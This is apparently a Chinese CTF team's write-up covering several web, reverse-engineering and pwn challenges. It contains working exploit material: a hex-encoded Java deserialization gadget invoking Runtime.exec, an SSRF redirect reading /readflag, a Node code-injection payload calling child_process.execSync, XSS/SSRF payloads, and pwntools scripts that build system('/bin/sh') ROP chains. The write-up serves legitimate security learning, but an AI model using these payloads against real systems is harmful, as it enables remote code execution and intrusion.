0009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;&quot;&#125;,&quot;（把上面两段再复制两遍）&#125;</code></pre><h3 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h3><p>观察 /user/profile 和 /user/verify 路由可知，profile 在处理 bucket 的更新时是先进行了更新再生成了 token。</p><p>而 verify 仅仅判断了库中是否存在所提交的 token 并且其 valid 为 true。</p><p>那么此时即存在了一个逻辑漏洞，先正常提交一次 bucket 更新，使得程序写入一个可行的 token，然后再次请求 profile 更新 bucket 为 SSRF 的值。使用第一次得到的 token 对第二次的恶意 bucket 进行 verify，从而成功达成 SSRF。由于此时的 bucket 被进行了如下校验。</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">static</span> <span class="token function">checkBucket</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>protocol <span class="token operator">!=</span> <span class="token string">"http:"</span> <span class="token operator">&amp;&amp;</span> url<span class="token punctuation">.</span>protocol <span class="token operator">!=</span> <span class="token string">"https:"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'oss-cn-beijing.ichunqiu.com'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>因此我们构造链接的形式被迫变为 <a href="http://host/#oss-cn-beijing.ichunqiu.com">http://HOST#oss-cn-beijing.ichunqiu.com</a>  也就是说我们只能使用指定协议。</p><p>此时可以使用 302 跳转进行绕过，在服务器上写如下 PHP 代码来进行跳转，从而达成任意文件读取。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: file:///readflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><p>此时再提交链接后访问 /bucket 路由即可触发一次访问。而访问所返回的内容则是根目录下 /readflag 的内容。</p><p>结合题目的提示可知我们需要 RCE，而读取到了 /readflag 则指明了方向。此时可以发现程序使用了 zombie 进行了访问，因此可以采用 zombie code injection 来进行 RCE，进而带出 flag。</p><p>公网vps写入：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"return(global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString())"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 8月 22, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> randombaseurl <span class="token operator">=</span> <span class="token string">"http://eci-2zedk1cbvvahhu2yuuyl.cloudeci1.ichunqiu.com:8888/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">"user/verify?token=%s"</span> <span class="token operator">%</span> token<span class="token punctuation">)</span>    session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"signup"</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>        <span class="token string">"password_confirm"</span><span class="token punctuation">:</span> password    <span class="token punctuation">&#125;</span>    <span class="token comment"># print(session.post(url, data=data, headers=header).text)</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"regist"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"signin"</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># print(session.post(url, data=data, headers=header))</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">modify</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"user/profile"</span>    data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"affiliation"</span><span class="token punctuation">:</span> <span class="token string">"ichunqiu123"</span><span class="token punctuation">,</span>        <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string">"bucket"</span><span class="token punctuation">:</span> <span class="token string">"https://895cdc8a2e67bbb23b5e6335fca98bc2.oss-cn-beijing.ichunqiu.com/"</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token comment"># print(res)</span>        token <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"?token="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"The page may be loading ..."</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"affiliation"</span><span class="token punctuation">:</span> <span class="token string">"ichunqiu123"</span><span class="token punctuation">,</span>        <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string">"bucket"</span><span class="token punctuation">:</span> payload<span class="token operator">+</span><span class="token string">"#oss-cn-beijing.ichunqiu.com"</span>    <span class="token punctuation">&#125;</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    verify<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"user/bucket"</span>    res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\n"</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"The page may be loading ..."</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span>    register<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    login<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    <span class="token comment"># modify("http://vps/test.php?1=file:///flag")</span>    modify<span class="token punctuation">(</span><span class="token string">"http://vps/test3.php"</span><span class="token punctuation">)</span>    view<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h3 id="Secrets-Of-Admin"><a href="#Secrets-Of-Admin" class="headerlink" title="Secrets_Of_Admin"></a>Secrets_Of_Admin</h3><p>先看database.ts，直接给出账号密码，<code>admin/e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</code>,同时还有flag的sum值</p><p>flag在file/flag中，审查代码发现我们要<strong>不是</strong>superuser<strong>且是</strong>admin才可以获取file下的文件，superuser被ban了</p><p>看<code>/</code>路由，由于database只要一个admin用户，所以直接登录，就是<code>isadmin</code>为true了</p><p>重定向到<code>/admin</code>路由，get方法没啥好说的，如果属于user的文件存在就写入cookie。 </p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> files <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">listFile</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>username<span class="token operator">:</span> token<span class="token punctuation">.</span>username<span class="token punctuation">,</span> files<span class="token operator">:</span> files<span class="token punctuation">,</span> isAdmin<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> signed<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>post方法可以看到ban掉了<code>&lt;</code>/<code>script</code>/<code>&gt;</code>等，从出题人的思路讲，可能是要打xss</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> <span class="token punctuation">&#123;</span> content <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> content <span class="token operator">==</span> <span class="token string">''</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'on'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// even admin can't be trusted right ? :)  </span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'Forbidden word 🤬'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用了html-pdf依赖用于生成pdf，然后保存文件到xx.pdf</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> filename <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.pdf</span><span class="token template-punctuation string">`</span></span></code></pre><p>在<code>/api/files</code>路由下带参数可以加一条log，带<code>/sumid</code>可以访问文件，可以看到superuser被ban了 </p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">'superuser'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Superuser is disabled now'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>但是关键点在于读取到文件后会进入模版渲染，加上前面ban了xss的东西，推测就是打xss了</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> filename <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"../files/"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">readFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"../files/"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No such file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>由于html-pdf 用到了phanthomjs渲染，因此存在ssrf。我们可以使用数组绕过<code>.includes(xxx)</code>的检测。并插入ssrf的内容</p><p>Payload:</p><pre class="language-none"><code class="language-none">content[]&#x3D;&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;api&#x2F;files?username&#x3D;admin&amp;filename&#x3D;..&#x2F;files&#x2F;flag&amp;checksum&#x3D;be5a14a8e504a66979f6938338b0662c&quot;;&lt;&#x2F;script&gt;</code></pre><p>容器打完后会崩，试了几次，然后访问下<code>/admin</code>路由 </p><p>直接去访问文件，<code>./api/files/be5a14a8e504a66979f6938338b0662c</code>，得到flag</p><hr><h2 id="Web总结"><a href="#Web总结" class="headerlink" title="Web总结"></a>Web总结</h2><p>觉得这是发挥不错的一场比赛了，虽然题目很简单，但是还是学到了很多，尤其是安全检测，自己独立凭感觉解出来题目自信心也是upup。还有层层穿透，很有趣的内网渗透题目，很简单，但是给我敲开了这扇大门，感觉很有兴趣，以后可以多研究一下。</p><p>以下是本队的WP，虽然成绩不太行，但是尽力就好。</p><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="勒索解密"><a href="#勒索解密" class="headerlink" title="勒索解密"></a>勒索解密</h3><p>32位exe程序，要知道程序加密文件的流程，</p><p>看到了这个，Microsoft Enhanced RSA and AES Cryptographic Provider</p>猜测先把key+timestamp联系到了一起，然后sha256加密变成那个key，再拿去aes加密。<img src="/article/2021xyb/3202085600-229394217-57394DB0558F49AAB782959EC5A93100.JPG" class="" title="3202085600-229394217-57394DB0558F49AAB782959EC5A93100" loading="lazy"><img src="/article/2021xyb/3202085600-886959209-9385D62446713B8751AEFB402591DB09.JPG" class="" title="3202085600-886959209-9385D62446713B8751AEFB402591DB09" loading="lazy"><p>和时间戳连着 然后给key</p><img src="/article/2021xyb/3202085600-201622791-5AC8865E89504CA44AD22B2BEE9B0612.JPG" class="" title="3202085600-201622791-5AC8865E89504CA44AD22B2BEE9B0612" loading="lazy"><p>来了一下0x800C这种加密，然后得到一个key，再拿这个key去aes加密文件</p><img src="/article/2021xyb/3202085600-1838268119-6D44CB41D7988685E018363677E2C6D9.JPG" class="" title="3202085600-1838268119-6D44CB41D7988685E018363677E2C6D9" loading="lazy"><p>AES：660E</p><img src="/article/2021xyb/3202085600-1920708629-16E549D4945DC54A0B07B4FB3F3591D3.JPG" class="" title="3202085600-1920708629-16E549D4945DC54A0B07B4FB3F3591D3" loading="lazy"><p>感觉那个rsa只是用来校验完整性</p><p>根据加密文件的时间戳，修正为UTC+0时间，可知中间的time应为0x611a1105</p><pre class="language-none"><code class="language-none">import base64from Crypto.Cipher import AESfrom Crypto import Randomimport hashlibimport osimport base64def encrypt(data, password):    bs &#x3D; AES.block_size    pad &#x3D; lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)    cipher &#x3D; AES.new(password)    data &#x3D; cipher.encrypt(pad(data))    return (data)    if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    key &#x3D; bytearray.fromhex(&#39;b22fc60e4fd4544b05111a6121e7b18e&#39;)    key &#x3D; hashlib.sha256(key).hexdigest()    key &#x3D; bytes.fromhex(key)[:16]    iv &#x3D; b&#39;\x00&#39;*16    cipher &#x3D; AES.new(key, AES.MODE_CBC, iv )    f &#x3D; open(&#39;flag.bmp.ctf_crypter&#39;, &#39;rb&#39;)    data &#x3D; f.read()[:-0x80-4]    de &#x3D; cipher.decrypt(data)    d &#x3D; open(&#39;daidai.bmp&#39;,&#39;wb&#39;)    d.write(de)    d.close()    f.close()</code></pre><img src="/article/2021xyb/1629625133(1).png" class="" title="1629625133(1)" loading="lazy"><h3 id="Rev-Dizzy"><a href="#Rev-Dizzy" class="headerlink" title="Rev_Dizzy"></a>Rev_Dizzy</h3><p>由于数据太大超过文档限制，这里不便贴出，两个puts直接解决，签到题。直接逆序文件，加减号互换，跑一下出flag。</p><img src="/article/2021xyb/1629629205(1).png" class="" title="1629629205(1)" loading="lazy"><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>通过scanf的格式化字符串漏洞修改TOPCHUNK的size并申请大于topchunk的堆块使其进入unsortedbin中，在申请回来时因为没有零截断所以可以直接打印出mainarena地址，进而获得libc基地址，通过计算偏移后可以构建system(“/bin/sh”)的ROP链并获取shell</p><p>exp：</p><pre class="language-none"><code class="language-none">from pwn import *import timecontext.log_level &#x3D; &#39;debug&#39;context.arch &#x3D; &#39;amd64&#39;def menu(index):p.sendlineafter(&#39;choice: &#39;, str(index))def add(size, content):menu(1)p.sendlineafter(&#39;size: &#39;, str(size))p.sendlineafter(&#39;content: &#39;, content)def say(say1, say2):menu(2)p.sendlineafter(&#39;say ? &#39;, say1)p.sendlineafter(&#39;? &#39;, say2)def debug():gdb.attach(p)p &#x3D; process(&#39;.&#x2F;pwn1&#39;)# p &#x3D; remote(&#39;47.104.70.90&#39;,&#39;25315&#39;)libc &#x3D; ELF(&#39;libc-2.23.so&#39;)rbp_rip &#x3D; &#39;%17$s\x00&#39;# gdb.attach(p,&#39;b *$rebase(0x1235)&#39;)add(0x10,&#39;lby&#39;)p.recvuntil(&#39;addr: &#39;)heap_addr &#x3D; int(p.recvline().replace(&#39;\n&#39;,&#39;&#39;),16)success(&#39;heap: &#39;+hex(heap_addr))pl1 &#x3D; &#39;%7$s&#39;+&#39;aaaa&#39;+p64(heap_addr)pl2 &#x3D; &#39;a&#39;*0x18+p64(0xfe1)say(pl1, pl2)for i in range(24):add(0x90,&#39;a&#39;*0x90)add(0xd0,&#39;a&#39;*0xd0)add(0x10, &#39;a&#39;*8)menu(3)p.recvuntil(&#39;content:aaaaaaaa\n&#39;)malloc_hook &#x3D; u64((&#39;\x00&#39;+p.recv(5)).ljust(8,&#39;\x00&#39;))-224-0x10libc_base &#x3D; malloc_hook-libc.sym[&#39;__malloc_hook&#39;]system &#x3D; libc_base+libc.sym[&#39;system&#39;]sh &#x3D; libc_base + libc.search(&#39;&#x2F;bin&#x2F;sh\x00&#39;).next()prdi_ret &#x3D; libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).next()success(hex(malloc_hook))pl3 &#x3D; p64(prdi_ret)+p64(sh)+p64(system)say(&#39;%17$s&#39;,&#39;a&#39;*8+pl3)p.interactive()</code></pre><h3 id="PassWordBox-FreeVersion"><a href="#PassWordBox-FreeVersion" class="headerlink" title="PassWordBox_FreeVersion"></a>PassWordBox_FreeVersion</h3><p>fgets处溢出一字节，构成off by null漏洞，输入的内容会被加密所以要进行逆向分析，确保我们在堆上的数据是正常的</p><p>观察show函数，不难发现其在show之前又执行了一次加密函数，并且创建堆块的时候会直接输出密钥加密后的内容，将其与我们输入的内容进行相异或即可得到随机值</p><p>解决了加密的问题，然后我们就可以利用前面提到的offbynull漏洞进行利用，构造堆重叠已经堆块复用的情况，通过让堆块进入unsortedbin以此来泄露libc基地址，最后再通过往free_hook中写入onegadget来获取shell</p><pre class="language-none"><code class="language-none">from pwn import *import timedef add(id,size,content):    p.sendlineafter(&quot;Input Your Choice:\n&quot;,str(1))    p.sendafter(&quot;Save:&quot;,str(id))    p.sendlineafter(&quot;Pwd:&quot;,str(size))    p.sendafter(&quot;Pwd:&quot;,content)def show(id):    p.sendlineafter(&quot;Choice:\n&quot;,str(3))    p.sendlineafter(&quot;Check:\n&quot;,str(id))def delete(id):    p.sendlineafter(&quot;Choice:\n&quot;,str(4))    p.sendlineafter(&quot;Delete:\n&quot;,str(id))def edit(id,data):    p.sendlineafter(&quot;Choice:\n&quot;,str(2))    p.sendline(str(id))    p.sendline(str(data))p&#x3D;process(&#39;.&#x2F;pwdFree&#39;)libc &#x3D; ELF(&quot;libc.so.6&quot;)add(0,0xf8,&#39;\n&#39;)p.recvuntil(&#39;D:&#39;)key&#x3D;u64(p.recv(8))rand&#x3D;key^0xaadd(1,0xf8,&#39;\n&#39;)add(2,0xf8,&#39;\n&#39;)for i in range(7):    add(i+3,0xf0,&#39;\n&#39;)  #3--9 full tcfor i in range(6):  #3-9 full tc    delete(i+3)delete(1)delete(0)num&#x3D;0x200^randpayload&#x3D;b&#39;c&#39;*0xf0+p64(num)add(0,0xf8,payload)delete(9)delete(2)for i in range(8):    add(1, 0xf8, &#39;\n&#39;)show(0)p.recvuntil(&#39;Pwd is: 